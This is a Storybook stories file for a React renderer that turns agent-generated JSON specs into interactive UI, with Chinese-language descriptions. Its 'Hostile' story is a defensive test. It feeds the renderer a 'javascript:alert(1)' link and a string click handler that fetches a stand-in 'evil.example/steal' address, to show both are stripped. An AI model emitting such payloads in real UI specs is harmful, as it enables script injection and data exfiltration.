import { useState } from 'react'
import type { Meta, StoryObj } from '@storybook/react'

import { A2UIRenderer, type A2UIAction, type A2UINode } from '@xinjiyuan97/chat-a2ui'
import { defaultA2UIRegistry } from '@xinjiyuan97/chat-ui/a2ui-registry'

import { DEPLOY_FORM_SPEC, STATUS_DATA, STATUS_SPEC } from '../fixtures'

const meta = {
  title: 'A2UI/Renderer',
  component: A2UIRenderer,
  parameters: {
    docs: {
      description: {
        component:
          'Agent 吐 JSON → 渲染成可交互 UI → 用户操作回传。**spec 等同不可信输入**：这里绝不 eval，`{{path}}` 只做安全路径查找，`when` 只认三种固定形式，节点数和深度都有上限，`javascript:` 链接和字符串事件处理器在到达组件之前就被剥掉。默认组件集里没有任何能导航、发请求或执行代码的东西。',
      },
    },
  },
  // Every story renders its own surface; this only satisfies the required props.
  args: {
    registry: defaultA2UIRegistry,
    spec: DEPLOY_FORM_SPEC,
  },
  argTypes: {
    registry: { control: false },
    spec: { control: false },
  },
} satisfies Meta<typeof A2UIRenderer>

export default meta
type Story = StoryObj<typeof meta>

/** Renders a surface next to the payload it emits, which is the whole contract. */
function Surface({ spec, data }: { spec: A2UINode; data?: Record<string, unknown> }) {
  const [actions, setActions] = useState<A2UIAction[]>([])
  const [resolved, setResolved] = useState(false)

  return (
    <div className="grid gap-4 lg:grid-cols-[minmax(0,420px)_minmax(0,1fr)]">
      <div className="rounded-cc-md border border-cc-border bg-cc-surface p-3.5 shadow-cc-card">
        <A2UIRenderer
          spec={spec}
          registry={defaultA2UIRegistry}
          data={data}
          surfaceId="demo-1"
          disabled={resolved}
          onAction={(action) => {
            setActions((list) => [...list, action])
            if (action.action !== 'cancel') setResolved(true)
          }}
        />
      </div>

      <div className="flex flex-col gap-2">
        <div className="flex items-center gap-2">
          <p className="text-cc-xs font-medium text-cc-muted">回传给 agent 的 action</p>
          {resolved && (
            <button
              type="button"
              onClick={() => {
                setResolved(false)
                setActions([])
              }}
              className="rounded-cc-xs border border-cc-border px-1.5 py-0.5 text-cc-xs text-cc-muted hover:bg-cc-subtle"
            >
              重置
            </button>
          )}
        </div>
        {actions.length === 0 ? (
          <p className="text-cc-xs text-cc-faint">还没有操作。填一下表单再点按钮。</p>
        ) : (
          actions.map((action, index) => (
            <pre
              key={index}
              className="overflow-x-auto rounded-cc-sm bg-cc-sunken p-2.5 font-cc-mono text-cc-xs text-cc-fg"
            >
              {JSON.stringify(action, null, 2)}
            </pre>
          ))
        )}
      </div>
    </div>
  )
}

export const FormCard: Story = {
  name: 'Interactive form card',
  render: () => <Surface spec={DEPLOY_FORM_SPEC} />,
}

export const DataDriven: Story = {
  name: 'Templates and conditions',
  render: () => <Surface spec={STATUS_SPEC} data={STATUS_DATA} />,
}

export const AllComponents: Story = {
  name: 'Default registry',
  render: () => (
    <Surface
      spec={{
        type: 'Column',
        props: { gap: 'lg' },
        children: [
          { type: 'Heading', props: { text: '默认组件集', level: 3 } },
          {
            type: 'Text',
            props: {
              text: '扩展方式是增量的：{ ...defaultA2UIRegistry, MyChart }。',
              tone: 'muted',
            },
          },
          {
            type: 'Row',
            props: { gap: 'sm', wrap: true },
            children: [
              { type: 'Badge', props: { text: 'default' } },
              { type: 'Badge', props: { text: 'accent', tone: 'accent' } },
              { type: 'Badge', props: { text: 'success', tone: 'success' } },
              { type: 'Badge', props: { text: 'warning', tone: 'warning' } },
              { type: 'Badge', props: { text: 'danger', tone: 'danger' } },
            ],
          },
          { type: 'Divider' },
          { type: 'Alert', props: { tone: 'info', title: '提示', text: '这是一个 info alert。' } },
          { type: 'Alert', props: { tone: 'danger', title: '失败', text: '部署被策略拦截。' } },
          { type: 'Progress', props: { value: 62, max: 100, label: '上传中' } },
          {
            type: 'List',
            props: { items: ['第一项', '第二项', '第三项'], ordered: true },
          },
          {
            type: 'Table',
            props: {
              columns: ['环境', '版本', '状态'],
              rows: [
                ['production', 'v2.4.1', 'healthy'],
                ['staging', 'v2.5.0-rc.2', 'degraded'],
              ],
            },
          },
          { type: 'KeyValue', props: { items: { 分支: 'main', 提交: '4f2a1c9' } } },
          { type: 'CodeBlock', props: { language: 'bash', text: 'pnpm deploy --canary 10' } },
          { type: 'Link', props: { href: 'https://example.com', text: '一个外链' } },
          {
            type: 'Row',
            props: { gap: 'sm' },
            children: [
              {
                type: 'Button',
                props: { label: 'Primary', variant: 'primary', onClick: { action: 'a' } },
              },
              {
                type: 'Button',
                props: { label: 'Subtle', variant: 'subtle', onClick: { action: 'b' } },
              },
              {
                type: 'Button',
                props: { label: 'Ghost', variant: 'ghost', onClick: { action: 'c' } },
              },
              {
                type: 'Button',
                props: { label: 'Danger', variant: 'danger', onClick: { action: 'd' } },
              },
            ],
          },
        ],
      }}
    />
  ),
}

/**
 * The defensive paths, all in one surface. Nothing here should throw, navigate, or
 * execute — each bad node degrades to something readable instead.
 */
export const Hostile: Story = {
  name: 'Malformed and hostile specs',
  render: () => (
    <div className="flex flex-col gap-6">
      <section className="flex flex-col gap-2">
        <h3 className="text-cc-xs font-medium text-cc-muted">未注册的组件类型</h3>
        <div className="rounded-cc-md border border-cc-border p-3">
          <A2UIRenderer
            spec={{ type: 'Column', children: [{ type: 'MysteryChart', props: { data: [1, 2] } }] }}
            registry={defaultA2UIRegistry}
            renderUnknown={(node) => (
              <div className="rounded-cc-xs bg-cc-subtle px-2 py-1.5 font-cc-mono text-cc-xs text-cc-muted">
                未知组件：{node.type}
              </div>
            )}
          />
        </div>
      </section>

      <section className="flex flex-col gap-2">
        <h3 className="text-cc-xs font-medium text-cc-muted">
          超出节点上限（maxNodes: 6）—— 已渲染的部分保留，其余降级提示
        </h3>
        <div className="rounded-cc-md border border-cc-border p-3">
          <A2UIRenderer
            spec={{
              type: 'Column',
              props: { gap: 'sm' },
              children: Array.from({ length: 40 }, (_, i) => ({
                type: 'Text',
                props: { text: `第 ${i + 1} 项` },
              })),
            }}
            registry={defaultA2UIRegistry}
            limits={{ maxNodes: 6 }}
            renderTruncated={(reason) => (
              <p className="mt-2 text-cc-xs text-cc-faint">内容过多，已截断（{reason}）</p>
            )}
          />
        </div>
      </section>

      <section className="flex flex-col gap-2">
        <h3 className="text-cc-xs font-medium text-cc-muted">
          javascript: 链接 —— href 在到达组件前被剥掉，退化成不可点的文本
        </h3>
        <div className="rounded-cc-md border border-cc-border p-3">
          <A2UIRenderer
            spec={{
              type: 'Column',
              props: { gap: 'sm' },
              children: [
                {
                  type: 'Link',
                  props: { href: 'javascript:alert(1)', text: '点我（不会有任何事发生）' },
                },
                { type: 'Link', props: { href: 'https://example.com', text: '正常链接' } },
              ],
            }}
            registry={defaultA2UIRegistry}
          />
        </div>
      </section>

      <section className="flex flex-col gap-2">
        <h3 className="text-cc-xs font-medium text-cc-muted">
          字符串事件处理器 —— 被丢弃，按钮什么也不会发出
        </h3>
        <div className="rounded-cc-md border border-cc-border p-3">
          <A2UIRenderer
            spec={{
              type: 'Button',
              props: { label: '试试', onClick: 'fetch("https://evil.example/steal")' },
            }}
            registry={defaultA2UIRegistry}
            onAction={() => window.alert('这行不该被执行到')}
          />
        </div>
      </section>
    </div>
  ),
}
